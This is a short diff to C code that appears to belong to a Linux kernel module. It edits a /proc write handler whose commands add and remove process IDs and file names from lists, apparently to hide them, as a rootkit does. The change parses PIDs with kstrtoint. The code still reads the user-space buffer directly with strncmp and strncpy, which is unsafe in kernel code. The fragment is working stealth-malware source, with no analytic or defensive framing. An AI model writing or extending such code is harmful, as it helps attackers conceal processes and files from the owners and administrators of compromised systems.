@@ -86,11 +86,21 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer,
 {
     int r;
     if (strncmp(buffer, "hp ", MIN(3, count)) == 0) {
-        add_to_pid_list(buffer + 3, count - 3);
+        int pid;
+        char s_pid[6];
+        strncpy(s_pid, buffer+3, MIN(6, count - 3));
+        s_pid[MIN(6, count-3)-1] = 0;
+        r = kstrtoint(s_pid, 10, &pid);
+        add_to_pid_list((unsigned short) pid);
     } else if (strncmp(buffer, "upa", MIN(3, count)) == 0) {
         clear_pid_list();
     } else if (strncmp(buffer, "up ", MIN(3, count)) == 0) {
-        remove_from_pid_list(buffer + 3, count - 3);
+        int pid;
+        char s_pid[6];
+        strncpy(s_pid, buffer+3, MIN(6, count - 3));
+        s_pid[MIN(6, count-3)-1] = 0;
+        r = kstrtoint(s_pid, 10, &pid);
+        remove_from_pid_list((unsigned short) pid);
     } else if (strncmp(buffer, "hf ", MIN(3, count)) == 0) {
         add_to_file_list(buffer + 3, count - 3);
     } else if (strncmp(buffer, "ufa", MIN(3, count)) == 0) {
